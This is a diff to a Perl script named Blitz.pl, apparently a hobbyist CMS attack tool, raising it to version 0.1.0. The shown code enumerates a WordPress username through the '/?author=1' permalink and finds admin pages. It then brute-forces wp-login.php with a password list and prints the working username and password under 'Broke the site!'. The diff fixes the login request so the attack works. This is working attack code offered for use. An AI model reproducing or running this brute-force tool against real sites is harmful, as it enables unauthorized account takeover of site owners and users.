@@ -14,9 +14,7 @@ use Term::ANSIColor;
 use Getopt::Long;
 #-- Turns off warnings for uninitialized values
 no warnings 'uninitialized';
-#-----------------------
-system('clear');
-#-----------------------
+
 #-- Banner
 my $banner = << 'EOB';
 +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
@@ -28,10 +26,75 @@ my $banner = << 'EOB';
 
 +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
 EOB
+#-- Changelog
+sub changelog {
+print q(
 
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
+CURRENT VERSION: 0.1.0
+
+Changes made:
+
+Version 0.1.0 -
+Basic WordPress scanning and attacking has been completed, Bug fixes, output fixes,
+better input checks have been made, removed redundant options
+
+Version 0.0.6 -
+Added WordPress brute forcing, minor bug fixes, removed the bundling configuration,
+began intitial testing
+
+Version 0.0.5 -
+Bug fixes
+
+Version 0.0.4 -
+Bug fixes and additional minor features added
+
+Version 0.0.3 -
+Added the functionality for CMS finger printing and admin page finding
+
+Version 0.0.2 -
+Basic functionality added
+
+Version 0.0.1 -
+Basic structure and design
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
+);
+
+}
+
+#-- Building the help menu
+sub help {
+  print q(
+  Usage: perl Blitz.pl [options] <arguments>
+
+  Example:
+
+  perl Blitz.pl -c wordpress -b -p -u -t target.com -ul users.txt -pl list.txt
+
+  perl Blitz.pl -cms joomla -brute -ulist users.txt -pl pass.txt
+
+  IMPORTANT: Only supported CMS' are: WordPress, Joomla!, and Drupal. More to come.
+
+  OPTIONS:
+
+  h|help      =>  Help menu
+  c|cms       =>  Tells the CMS that is being targeted (reuired if -g is not being used)
+  g|guess     =>  Attempts to guess target CMS
+  b|brute     =>  Attempts to find an brute force the login page
+  p|plugins   =>  Attempts to find the plugins in use
+  t|target    =>  Provides the target to scan (required)
+  s|server    =>  Attempts to find the server status (and more when I stop being lazy)
+  pl|plist    =>  Provide a list of passwords (required if -b is in use)
+  ex|exploit  =>  Attempt to reach exploit-db and gather a list of exploits
+);
+  print color('reset');
+}
 #-----------------------
+system('clear');
+#-----------------------
+
 #-- Global variables
-my ($help, $cms, $guess, $brute, $plugins, $target, $user, $server, $ulist, $plist, $admin);
+my ($help, $cms, $guess, $brute, $plugins, $target, $server, $plist, $admin);
 #-- Options to be used in the command line and their associated variables
 #-- *=s sets the variable as a string
 GetOptions(
@@ -41,9 +104,7 @@ GetOptions(
   "b|brute"       =>  \$brute,
   "p|plugins"     =>  \$plugins,
   "t|target=s"    =>  \$target,
-  "u|user"        =>  \$user,
   "s|server"      =>  \$server,
-  "ul|ulist=s"    =>  \$ulist,
   "pl|plist=s"    =>  \$plist,
   "a|admin"       =>  \$admin,
 );
@@ -82,13 +143,12 @@ if ($help ne ''){
     exit(0);
   }
 }
-
-#-- Currently debugging, broken af.. somehow, I'm not too sure
+#-- Works
 if ($brute){
-  if($ulist eq '' || $plist eq ''){
+  if($plist eq ''){
     help();
     print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
-    print color('bright_red'),"[*] Provide a list of usernames and passwords\n";
+    print color('bright_red'),"[*] Provide a list of passwords\n";
     print color('magenta'),"[*] Press ENTER to quit...";
     print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
     <STDIN>;
@@ -118,86 +178,23 @@ if (($cms eq '') && ($guess eq '')){
 #-- END of variable check
 #-----------------------
 #-- Running stuff
+#-- Everything in this section works
+
+print color('bright_white'),"$banner\n[*] Target: $target\n";
+
 if ($server){
-  server_find();
+  status_code();
 }
-if (($user) && ($cms =~ /wordpress/i)){
-  wp_user();
-} elsif (($user) && ($cms !~ /wordpress/i)){
-  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
-  print color('bold red'), "[*] Incompatible CMS\n", color('reset');
-  print color('bold red'), "[*] Skipping user scraping\n", color('reset');
-  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
+if ($brute) {
+  if ($cms =~ /wordpress/i) {
+    admin_find();
+    wp_user();
+  }
 }
-
+if ($guess){
+  cms_hunt();
+}
 #-----------------------
-#-- Changelog
-sub changelog {
-print q(
-
-+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
-CURRENT VERSION: 0.0.6
-
-Changes made:
-
-Version 0.0.6 -
-Added WordPress brute forcing, minor bug fixes, removed the bundling configuration,
-began intitial testing
-
-Version 0.0.5 -
-Bug fixes
-
-Version 0.0.4 -
-Bug fixes and additional minor features added
-
-Version 0.0.3 -
-Added the functionality for CMS finger printing and admin page finding
-
-Version 0.0.2 -
-Basic functionality added
-
-Version 0.0.1 -
-Basic structure and design
-+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
-);
-
-}
-
-#-- Building the help menu
-sub help {
-  print color('bright_white');
-  print $banner;
-  print color('bright_cyan');
-  print q(
-  Usage: perl Blitz.pl [options] <arguments>
-
-  Example:
-
-  perl Blitz.pl -c wordpress -b -p -u -t target.com -ul users.txt -pl list.txt
-
-  perl Blitz.pl -cms joomla -brute -ulist users.txt -pl pass.txt
-
-  IMPORTANT: Only supported CMS' are: WordPress, Joomla!, and Drupal. More to come.
-
-  OPTIONS:
-
-  h|help      =>  Help menu
-  a|admin     =>  Admin page finding
-  c|cms       =>  Tells the CMS that is being targeted (reuired if -g is not being used)
-  g|guess     =>  Attempts to guess target CMS
-  b|brute     =>  Attempts to find an brute force the login page
-  p|plugins   =>  Attempts to find the plugins in use
-  t|target    =>  Provides the target to scan (required)
-  u|user      =>  Attempts to scrape a username (Only compatible with WordPress)
-  s|server    =>  Attempts to find the server daemon
-  ul|ulist    =>  Provide a list of usernames (required if -b is in use)
-  pl|plist    =>  Provide a list of passwords (required if -b is in use)
-  ex|exploit  =>  Attempt to reach exploit-db and gather a list of exploits (I'll get around to this at somepoint)
-
-);
-  print color('reset');
-}
-
 #-- subroutine building
 sub cms_hunt {
   #-- Runs a GET request to get the page content for filtering
@@ -218,26 +215,10 @@ sub cms_hunt {
     print color('bold red'), "[*] Unable to determine CMS\n";
     print color('magenta'), "[*] Press ENTER to quit...";
     <STDIN>;
+    print color('reset');
     exit(0);
   }
 }
-
-#-- Hunts for the server daemon (Apache, Nginx, etc)
-sub server_find {
-  my $sock = IO::Socket::INET->new(PeerAddr => $target, PeerPort => 80, Proto => 'tcp', Timeout => 1);
-  if ($sock){
-    $sock->print("HEAD / HTTP/1.1\n\n\n\n");
-    while(<$sock>){
-      my $server = $_;
-      if($_ =~ m/^server:(.*?)/ig){
-        print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
-        print color('bold green'), "[*]$_\n";
-        print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
-      }
-    }
-  }
-}
-
 #-- Server status code finding
 sub status_code {
   my $code = $bot->get($target);
@@ -253,11 +234,14 @@ sub admin_find {
   my $joomla_admin = "/admininstrator/index.php";
   my $drupal_admin = "/user/login";
 
+  #-- Hunting for admin pages
   my $admin;
   if ($cms =~ /wordpress/gi){
-    $admin = $bot->get($target.$wp_admin);
-    if ($bot->is_success){
-      print color('bright_cyan'), "[*] Able to get to the admin page!\n", color('reset');
+    $admin = $target.$wp_admin;
+    my $req = HTTP::Request->new(GET=>$admin); #sends a GET request for the pages
+  	my $res = $bot->request($req);
+    if ($res -> is_success){
+      print color('bright_cyan'), "[*] Able to get to the admin page!\n[*] $admin\n", color('reset');
       return $admin;
     }
     else {
@@ -265,9 +249,11 @@ sub admin_find {
       }
     }
   elsif($cms =~ /joomla|joomla!/gi) {
-    $admin = $bot->get($target.$joomla_admin);
-    if ($bot->is_success){
-      print color('bright_cyan'), "[*] Able to get to the admin page!\n", color('reset');
+    $admin = $target.$joomla_admin;
+    my $req = HTTP::Request->new(GET=>$admin);
+    my $res = $bot->request($req);
+    if ($res -> is_success){
+      print color('bright_cyan'), "[*] Able to get to the admin page!\n[*] $admin\n", color('reset');
       return $admin;
     }
     else {
@@ -275,9 +261,11 @@ sub admin_find {
       }
     }
   elsif($cms =~ /drupal/gi) {
-    $admin = $bot->get($target.$drupal_admin);
-    if ($bot->is_success){
-      print color('bright_cyan'), "[*] Able to get to the admin page!\n", color('reset');
+    $admin = $target.$drupal_admin;
+    my $req = HTTP::Request->new(GET=>$admin);
+  	my $res = $bot->request($req);
+    if ($res -> is_success){
+      print color('bright_cyan'), "[*] Able to get to the admin page!\n[*] $admin\n", color('reset');
       return $admin;
     }
     else {
@@ -288,12 +276,13 @@ sub admin_find {
 
 #-- Scrapes the username from the author permalink (WordPress only)
 sub wp_user {
-  $user = $target."/?author=1";
+  my $user = $target."/?author=1";
   my $req = HTTP::Request ->new(GET=>$user);
   my $userhunt = $bot->request($req)->content;
   if($userhunt =~/author\/(.*?)\//){
     my $victim = $1;
-    print $victim;
+    print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
+    print color('bold green'),"[*] Found a user: $victim\n";
     if ($brute){
       wp_brute($victim);
     }
@@ -302,14 +291,10 @@ sub wp_user {
 
 #-- Narrowed brute forcing subroutines
 sub wp_brute {
-  #-- Optional test to see if the admin page is accessible
-  if ($admin){
-    admin_find();
-  }
   my $victim = shift;
   if ($victim){
     print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
-    print color('bright_cyan'), "[*] Using user $victim\n";
+    print color('bright_cyan'), "[*] Using user: $victim\n";
     print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
 
     open my $pass_handle, '<', $plist;
@@ -320,43 +305,18 @@ sub wp_brute {
         chomp(my $passwd = $_);
           my $host = $target . '/wp-login.php';
           my $auth = $target . '/wp-admin/';
-          my $login = POST $target,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth];
+          my $login = POST $host,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth];
           my $attempt = $bot->request($login);
           my $status = $attempt-> as_string;
-          if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){  color('bold green');
-            print "[*]Broke the site!\n";
-            print "[*] =>\t$victim \n";
-            print "[*] =>\t$passwd \n";
-            print color('reset');
-          }
-        }
-      }
-  if ($user eq ''){
-    open my $user_handle, '<', $ulist;
-    chomp(my @users = <$user_handle>);
-    close $user_handle;
-    open my $pass_handle, '<', $plist;
-    chomp(my @pass = <$pass_handle>);
-    close $pass_handle;
-
-    foreach (@users) {
-      chomp(my $users = $_);
-        foreach (@pass) {
-          chomp(my $passwd = $_);
-          my $host = $target . '/wp-login.php';
-          my $auth = $target . '/wp-admin/';
-          my $login = POST $target,[log => $users, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth];
-          my $attempt = $bot->request($login);
-          my $status = $attempt-> as_string;
-          if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){  color('bold green');
-            print "[*]Broke the site!\n";
-            print "[*] =>\t$users \n";
-            print "[*] =>\t$passwd \n";
+          if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){
+            print color('bold green'), "[*] Broke the site!\n";
+            print "[*] UserName: $victim \n";
+            print "[*] Password: $passwd \n";
+            print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
             print color('reset');
         }
       }
     }
-  }
 }
 
 sub joomla_brute {}
